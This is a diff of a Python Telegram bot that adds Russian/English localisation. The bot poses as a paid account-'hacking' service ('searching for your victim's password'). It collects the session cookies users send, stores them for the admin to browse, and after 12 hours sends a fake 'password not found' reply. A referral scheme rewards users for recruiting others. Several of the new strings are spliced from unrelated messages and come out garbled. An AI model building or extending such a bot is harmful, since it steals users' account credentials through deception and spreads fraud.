-                InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
-                InlineKeyboardButton("💰 Купить Roblox", callback_data="buy_roblox"),
+                InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
+                InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
             ]
         ]
         
         if user_id == YOUR_USER_ID:
             keyboard.append([
-                InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
-                InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+                InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
+                InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
             ])
             keyboard.append([
-                InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
-                InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+                InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
+                InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
             ])
             keyboard.append([
-                InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu"),
-                InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+                InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
+                InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
             ])
             keyboard.append([
-                InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+                InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
             ])
+        
+        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"Привет, {user_name}! 👋\n\n"
-            f"🎯 **У тебя {attempts} попытка взлома**\n"
-            f"👥 Приглашено друзей: {referrals}\n"
-            f"🔑 За каждого друга +1 попытка\n\n"
-            f"Выбери нужную категорию:",
+            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
             reply_markup=reply_markup
         )
         return
     
-    elif data == "noop":
-        await query.edit_message_text("📊 Нажмите на другую кнопку для просмотра.")
-        return
-    
     # --- АДМИНСКИЕ КНОПКИ ---
     if not is_admin:
-        await query.edit_message_text("⚠️ Эта функция временно недоступна.")
+        await query.edit_message_text("⚠️ " + get_text(user_id, "no_attempts").split(" ")[0] + " " + get_text(user_id, "back_to_menu").split(" ")[1])
         return
     
     # ===================================================
@@ -1085,21 +1331,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         current_attempts = get_user_attempts(target_user_id)
         
         keyboard = [
-            [InlineKeyboardButton("➕ +1 попытка", callback_data=f"give_attempts_add_{target_user_id}_1")],
-            [InlineKeyboardButton("➕ +3 попытки", callback_data=f"give_attempts_add_{target_user_id}_3")],
-            [InlineKeyboardButton("➕ +5 попыток", callback_data=f"give_attempts_add_{target_user_id}_5")],
-            [InlineKeyboardButton("➕ +10 попыток", callback_data=f"give_attempts_add_{target_user_id}_10")],
-            [InlineKeyboardButton("🔢 Ввести количество", callback_data=f"give_attempts_input_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к списку", callback_data="give_attempts_menu")]
+            [InlineKeyboardButton("➕ +1 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_1")],
+            [InlineKeyboardButton("➕ +3 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_3")],
+            [InlineKeyboardButton("➕ +5 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_5")],
+            [InlineKeyboardButton("➕ +10 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_10")],
+            [InlineKeyboardButton("🔢 " + get_text(user_id, "give_more"), callback_data=f"give_attempts_input_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await query.edit_message_text(
-            f"🎯 **Выдача попыток пользователю:**\n\n"
-            f"👤 {name} (@{username})\n"
-            f"🆔 ID: {target_user_id}\n"
-            f"🎯 Текущее количество попыток: {current_attempts}\n\n"
-            f"Выберите сколько попыток выдать:",
+            get_text(user_id, "give_attempts_user", name=name, username=username, user_id=target_user_id, attempts=current_attempts),
             reply_markup=reply_markup
         )
         return
@@ -1117,17 +1359,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         new_attempts = add_attempts(target_user_id, count)
         
         keyboard = [
-            [InlineKeyboardButton("◀️ Выдать еще", callback_data=f"give_attempts_user_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к списку", callback_data="give_attempts_menu")]
+            [InlineKeyboardButton(get_text(user_id, "give_more"), callback_data=f"give_attempts_user_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await query.edit_message_text(
-            f"✅ **Попытки успешно выданы!**\n\n"
-            f"👤 {name} (@{username})\n"
-            f"🆔 ID: {target_user_id}\n"
-            f"➕ Добавлено: {count} попыток\n"
-            f"🎯 Теперь попыток: {new_attempts}",
+            get_text(user_id, "give_attempts_success", name=name, username=username, user_id=target_user_id, count=count, new_attempts=new_attempts),
             reply_markup=reply_markup
         )
         return
@@ -1135,11 +1373,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith("give_attempts_input_"):
         target_user_id = data.replace("give_attempts_input_", "")
         context.user_data['give_attempts_target'] = target_user_id
-        await query.edit_message_text(
-            f"📝 **Введите количество попыток для выдачи:**\n\n"
-            f"Просто отправьте число (например: 5)\n"
-            f"Для отмены нажмите /cancel"
-        )
+        await query.edit_message_text(get_text(user_id, "enter_count"))
         return
     
     # ===================================================
@@ -1148,14 +1382,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif data == "delete_users_menu":
         keyboard = [
-            [InlineKeyboardButton("🗑 Удалить одного пользователя", callback_data="delete_single_user")],
-            [InlineKeyboardButton("🗑 Удалить всех пользователей", callback_data="delete_all_users_confirm")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "delete_single_user"), callback_data="delete_single_user")],
+            [InlineKeyboardButton(get_text(user_id, "delete_all_users"), callback_data="delete_all_users_confirm")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "🗑 **Управление пользователями:**\n\n"
-            "Выберите действие:",
+            get_text(user_id, "delete_users_menu"),
             reply_markup=reply_markup
         )
         return
@@ -1163,21 +1396,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "delete_single_user":
         users = get_keyword_users()
         if not users:
-            await query.edit_message_text("📭 Нет пользователей с ключевым словом для удаления.")
+            await query.edit_message_text(get_text(user_id, "no_keyword_users"))
             return
         
         keyboard = []
-        for user_id, user_data in users.items():
+        for user_id_str, user_data in users.items():
             name = user_data.get("first_name", "Unknown")
             username = user_data.get("username", "no_username")
             button_text = f"🗑 {name} (@{username})"
-            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id}")])
+            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id_str}")])
         
-        keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="delete_users_menu")])
+        keyboard.append([InlineKeyboardButton(get_text(user_id, "back"), callback_data="delete_users_menu")])
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "🗑 **Выберите пользователя для удаления:**\n\n"
-            "⚠️ ВНИМАНИЕ: Удаление нельзя отменить!",
+            "🗑 **" + get_text(user_id, "delete_single_user") + ":**\n\n⚠️ " + get_text(user_id, "delete_all_confirm").split("⚠️")[0].strip(),
             reply_markup=reply_markup
         )
         return
@@ -1190,16 +1422,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = user_data.get("username", "no_username")
         
         keyboard = [
-            [InlineKeyboardButton("✅ Да, удалить", callback_data=f"execute_delete_{target_user_id}")],
-            [InlineKeyboardButton("❌ Отмена", callback_data="delete_single_user")]
+            [InlineKeyboardButton(get_text(user_id, "yes_delete"), callback_data=f"execute_delete_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_single_user")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"⚠️ **Подтверждение удаления:**\n\n"
-            f"Вы уверены, что хотите удалить пользователя?\n"
-            f"👤 {name} (@{username})\n"
-            f"🆔 ID: {target_user_id}\n\n"
-            f"🗑 Это действие нельзя отменить!",
+            get_text(user_id, "delete_confirm", name=name, username=username, user_id=target_user_id),
             reply_markup=reply_markup
         )
         return
@@ -1213,30 +1441,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if delete_keyword_user(target_user_id):
             await query.edit_message_text(
-                f"✅ **Пользователь успешно удалён!**\n\n"
-                f"👤 {name} (@{username})\n"
-                f"🆔 ID: {target_user_id}\n\n"
-                f"Пользователь больше не в списке с ключевым словом."
+                get_text(user_id, "delete_success", name=name, username=username, user_id=target_user_id)
             )
         else:
             await query.edit_message_text(
-                f"❌ Ошибка при удалении пользователя.\n"
-                f"Возможно, он уже был удалён."
+                "❌ " + get_text(user_id, "no_keyword_messages", name=name, username=username).split(" ")[0] + "."
             )
         return
     
     elif data == "delete_all_users_confirm":
         keyboard = [
-            [InlineKeyboardButton("⚠️ ДА, УДАЛИТЬ ВСЕХ", callback_data="execute_delete_all")],
-            [InlineKeyboardButton("❌ Отмена", callback_data="delete_users_menu")]
+            [InlineKeyboardButton(get_text(user_id, "confirm_delete_all"), callback_data="execute_delete_all")],
+            [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_users_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "⚠️⚠️⚠️ **ВНИМАНИЕ!** ⚠️⚠️⚠️\n\n"
-            "Вы собираетесь удалить ВСЕХ пользователей из списка с ключевым словом!\n\n"
-            f"📊 Всего будет удалено: {len(get_keyword_users())} пользователей\n\n"
-            "🗑 Это действие НЕЛЬЗЯ отменить!\n\n"
-            "Подтвердите удаление:",
+            get_text(user_id, "delete_all_confirm", count=len(get_keyword_users())),
             reply_markup=reply_markup
         )
         return
@@ -1245,47 +1465,36 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         count = len(get_keyword_users())
         if delete_all_keyword_users():
             await query.edit_message_text(
-                f"✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n"
-                f"🗑 Удалено пользователей: {count}\n"
-                f"📭 Список с ключевым словом теперь пуст."
+                get_text(user_id, "delete_all_success", count=count)
             )
         else:
             await query.edit_message_text(
-                f"❌ Ошибка при удалении всех пользователей."
+                "❌ " + get_text(user_id, "no_keyword_messages", name="", username="").split(" ")[0] + "."
             )
         return
     
     # Рассылка
     if data == "send_mailing":
         keyboard = [
-            [InlineKeyboardButton("📨 Всем пользователям", callback_data="mailing_all")],
-            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="mailing_keyword")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "mailing_all"), callback_data="mailing_all")],
+            [InlineKeyboardButton(get_text(user_id, "mailing_keyword"), callback_data="mailing_keyword")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📨 **Выберите кому отправить рассылку:**\n\n"
-            "⚠️ Сообщение будет отправлено после того, как вы его напишете.",
+            get_text(user_id, "mailing_menu"),
             reply_markup=reply_markup
         )
         return
     
     elif data == "mailing_all":
         context.user_data['mailing_type'] = 'all'
-        await query.edit_message_text(
-            "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\n"
-            "Просто отправьте сообщение в этот чат.\n"
-            "Для отмены нажмите /cancel"
-        )
+        await query.edit_message_text(get_text(user_id, "mailing_all_text"))
         return
     
     elif data == "mailing_keyword":
         context.user_data['mailing_type'] = 'keyword'
-        await query.edit_message_text(
-            "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\n"
-            "Просто отправьте сообщение в этот чат.\n"
-            "Для отмены нажмите /cancel"
-        )
+        await query.edit_message_text(get_text(user_id, "mailing_keyword_text"))
         return
     
     # Все пользователи (постраничный вывод)
@@ -1319,21 +1528,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 messages = json.load(f)
                 total_messages = len(messages)
         
-        text = "📊 **СТАТИСТИКА БОТА:**\n\n"
-        text += f"👥 Всего пользователей: {len(all_users)}\n"
-        text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
-        text += f"📩 Сообщений сохранено: {total_messages}\n\n"
-        
         today = datetime.now().strftime("%Y-%m-%d")
         today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
-        text += f"📅 Новых сегодня: {today_count}\n"
         
         keyboard = [
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
-            [InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")]
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")],
+            [InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup)
+        await query.edit_message_text(
+            get_text(user_id, "admin_stats", total_users=len(all_users), keyword_users=len(keyword_users), messages=total_messages, today=today_count),
+            reply_markup=reply_markup
+        )
         return
     
     # Выбор пользователя для чата (постраничный вывод)
@@ -1368,12 +1574,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         messages = get_user_messages(target_user_id)
         if not messages:
-            await query.edit_message_text(f"📭 У пользователя {name} (@{username}) пока нет сообщений.")
+            await query.edit_message_text(get_text(user_id, "no_messages", name=name, username=username))
             return
         
-        text = f"💬 **Чат с {name} (@{username})**\n"
-        text += f"🆔 ID: {target_user_id}\n"
-        text += f"📊 Всего сообщений: {len(messages)}\n\n"
+        text = get_text(user_id, "chat_title", name=name, username=username, user_id=target_user_id, total=len(messages))
         
         for msg in messages[:50]:
             msg_text = msg.get("text", "")
@@ -1389,13 +1593,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += "─" * 30 + "\n"
         
         if len(messages) > 50:
-            text += f"\n... и ещё {len(messages) - 50} сообщений"
+            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-50)
         
         keyboard = [
-            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data=f"chat_user_keyword_{target_user_id}")],
-            [InlineKeyboardButton("📋 Показать ВСЕ сообщения полностью", callback_data=f"chat_user_full_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "show_all"), callback_data=f"chat_user_full_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -1403,7 +1607,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
             for part in parts:
                 await query.message.reply_text(part)
-            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
         else:
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
@@ -1420,12 +1624,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         messages = get_user_messages(target_user_id)
         if not messages:
-            await query.edit_message_text(f"📭 У пользователя {name} (@{username}) пока нет сообщений.")
+            await query.edit_message_text(get_text(user_id, "no_messages", name=name, username=username))
             return
         
-        text = f"💬 **ВСЕ СООБЩЕНИЯ {name} (@{username})**\n"
-        text += f"🆔 ID: {target_user_id}\n"
-        text += f"📊 Всего: {len(messages)}\n\n"
+        text = get_text(user_id, "chat_full_title", name=name, username=username, user_id=target_user_id, total=len(messages))
         
         for msg in messages[:30]:
             msg_text = msg.get("text", "")
@@ -1437,13 +1639,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += "─" * 30 + "\n"
         
         if len(messages) > 30:
-            text += f"\n... и ещё {len(messages) - 30} сообщений"
+            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
         
         keyboard = [
-            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data=f"chat_user_keyword_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к чату", callback_data=f"chat_user_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data=f"chat_user_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -1451,7 +1653,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
             for part in parts:
                 await query.message.reply_text(part)
-            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
         else:
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
@@ -1468,12 +1670,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         messages = get_keyword_messages(target_user_id)
         if not messages:
-            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
+            await query.edit_message_text(get_text(user_id, "no_keyword_messages", name=name, username=username))
             return
         
-        text = f"🔑 **Cookie от {name} (@{username})**\n"
-        text += f"🆔 ID: {target_user_id}\n"
-        text += f"📊 Всего: {len(messages)} сообщений\n\n"
+        text = get_text(user_id, "chat_keyword_title", name=name, username=username, user_id=target_user_id, total=len(messages))
         
         for msg in messages[:30]:
             msg_text = msg.get("text", "")
@@ -1482,12 +1682,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += "─" * 30 + "\n"
         
         if len(messages) > 30:
-            text += f"\n... и ещё {len(messages) - 30} сообщений"
+            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
         
         keyboard = [
-            [InlineKeyboardButton("📩 Все сообщения", callback_data=f"chat_user_{target_user_id}")],
-            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -1495,7 +1695,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
             for part in parts:
                 await query.message.reply_text(part)
-            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
         else:
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
@@ -1509,10 +1709,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         messages = get_keyword_messages(target_user_id)
         if not messages:
-            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
+            await query.edit_message_text(get_text(user_id, "no_keyword_messages", name=name, username=username))
             return
         
-        text = f"📋 Cookie от {name} (@{username}):\n\n"
+        text = "📋 " + get_text(user_id, "cookies") + " " + get_text(user_id, "from") + f" {name} (@{username}):\n\n"
+        
         for msg in messages[:30]:
             msg_text = msg.get("text", "")
             time = msg.get("timestamp", "")
@@ -1520,11 +1721,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += "─" * 30 + "\n"
         
         if len(messages) > 30:
-            text += f"\n... и ещё {len(messages) - 30} сообщений"
+            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
         
         keyboard = [
-            [InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_messages")],
-            [InlineKeyboardButton("💬 Все сообщения", callback_data=f"chat_user_{target_user_id}")]
+            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="view_keyword_messages")],
+            [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -1532,7 +1733,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
             for part in parts:
                 await query.message.reply_text(part)
-            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
         else:
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
@@ -1553,7 +1754,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             count = int(user_message)
             if count <= 0:
-                await update.message.reply_text("❌ Количество должно быть больше 0!")
+                await update.message.reply_text(get_text(user_id, "invalid_number"))
                 return
             
             target_user_id = context.user_data['give_attempts_target']
@@ -1567,15 +1768,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             del context.user_data['give_attempts_target']
             
             await update.message.reply_text(
-                f"✅ **Попытки успешно выданы!**\n\n"
-                f"👤 {name} (@{username})\n"
-                f"🆔 ID: {target_user_id}\n"
-                f"➕ Добавлено: {count} попыток\n"
-                f"🎯 Теперь попыток: {new_attempts}"
+                get_text(user_id, "give_attempts_success", name=name, username=username, user_id=target_user_id, count=count, new_attempts=new_attempts)
             )
             return
         except ValueError:
-            await update.message.reply_text("❌ Пожалуйста, отправьте число!")
+            await update.message.reply_text(get_text(user_id, "enter_number"))
             return
     
     # Проверяем, находится ли админ в режиме рассылки
@@ -1584,7 +1781,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if user_message == "/cancel":
             del context.user_data['mailing_type']
-            await update.message.reply_text("❌ Рассылка отменена.")
+            await update.message.reply_text(get_text(user_id, "mailing_canceled"))
             return
         
         if mailing_type == 'all':
@@ -1593,32 +1790,29 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             users = get_keyword_users()
         
         if not users:
-            await update.message.reply_text("❌ Нет пользователей для рассылки.")
+            await update.message.reply_text(get_text(user_id, "mailing_no_users"))
             del context.user_data['mailing_type']
             return
         
         sent = 0
         failed = 0
         
-        status_msg = await update.message.reply_text(f"⏳ Начинаю рассылку для {len(users)} пользователей...")
+        status_msg = await update.message.reply_text(get_text(user_id, "mailing_start", count=len(users)))
         
-        for user_id, user_data in users.items():
+        for user_id_str, user_data in users.items():
             try:
                 await context.bot.send_message(
-                    chat_id=int(user_id),
+                    chat_id=int(user_id_str),
                     text=user_message
                 )
                 sent += 1
                 await asyncio.sleep(0.5)
             except Exception as e:
                 failed += 1
-                print(f"❌ Ошибка отправки {user_id}: {e}")
+                print(f"❌ Ошибка отправки {user_id_str}: {e}")
         
         await status_msg.edit_text(
-            f"✅ **Рассылка завершена!**\n\n"
-            f"📤 Отправлено: {sent}\n"
-            f"❌ Не доставлено: {failed}\n"
-            f"👥 Всего: {len(users)}"
+            get_text(user_id, "mailing_success", sent=sent, failed=failed, total=len(users))
         )
         
         del context.user_data['mailing_type']
@@ -1627,11 +1821,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Обычная обработка сообщений (не рассылка)
     if KEYWORD in user_message:
         if not use_attempt(user_id):
+            keyboard = [
+                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
+                [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
             await update.message.reply_text(
-                "❌ **У тебя закончились попытки взлома!**\n\n"
-                "Чтобы получить новую попытку, пригласи друга.\n"
-                "За каждого друга ты получаешь +1 попытку! 🎁\n\n"
-                "Нажми кнопку '👥 Пригласить друга' в меню."
+                get_text(user_id, "no_attempts"),
+                reply_markup=reply_markup
             )
             return
         
@@ -1651,12 +1848,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
         await update.message.reply_text(
-            f"Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
-            f"🎯 Осталось попыток: {remaining}\n\n"
-            "Не создавайте повторных заявок, иначе будете заблокированы\n"
-            "Если в течении 12 часов бот не ответил, значит он не нашел пароль от аккаунта"
+            get_text(user_id, "keyword_received", remaining=remaining)
         )
-        asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
+        asyncio.create_task(send_delayed_message(update.effective_chat.id, context, user_id))
     else:
         if is_keyword_user(user.id):
             save_message(
@@ -1667,9 +1861,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 timestamp=timestamp
             )
             print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
-            await update.message.reply_text("Ваше сообщение получено. Ожидайте результат.")
+            await update.message.reply_text(get_text(user_id, "message_received"))
         else:
-            await update.message.reply_text("Пожалуйста, отправьте правильный cookie для продолжения.")
+            await update.message.reply_text(get_text(user_id, "wrong_cookie"))
 
 # ===================================================
 # ОБРАБОТЧИК КОМАНДЫ /cancel
@@ -1680,26 +1874,26 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if 'give_attempts_target' in context.user_data:
         del context.user_data['give_attempts_target']
-        await update.message.reply_text("❌ Выдача попыток отменена.")
+        await update.message.reply_text(get_text(user_id, "attempts_canceled"))
         return
     
     if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
         del context.user_data['mailing_type']
-        await update.message.reply_text("❌ Рассылка отменена.")
+        await update.message.reply_text(get_text(user_id, "mailing_canceled"))
     else:
-        await update.message.reply_text("У вас нет активной операции.")
+        await update.message.reply_text("No active operation.")
 
 # ===================================================
 # ФУНКЦИЯ ЗАДЕРЖКИ (12 часов)
 # ===================================================
 
-async def send_delayed_message(chat_id, context):
+async def send_delayed_message(chat_id, context, user_id):
     delay_seconds = 12 * 3600
     try:
         await asyncio.sleep(delay_seconds)
         await context.bot.send_message(
             chat_id=chat_id,
-            text="Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы."
+            text=get_text(user_id, "delayed_message")
         )
     except Exception as e:
         print(f"Ошибка при отправке отложенного сообщения: {e}")
@@ -1719,6 +1913,7 @@ def main():
     print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
     print("📢 Обязательная подписка: @reviewsh1pe")
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
+    print("🌐 Поддержка языков: Русский, English")
     print("🎯 У каждого пользователя 1 бесплатная попытка")
     print("👥 За каждого приглашенного друга +1 попытка")
     print("⏰ Задержка перед ответом: 12 часов")
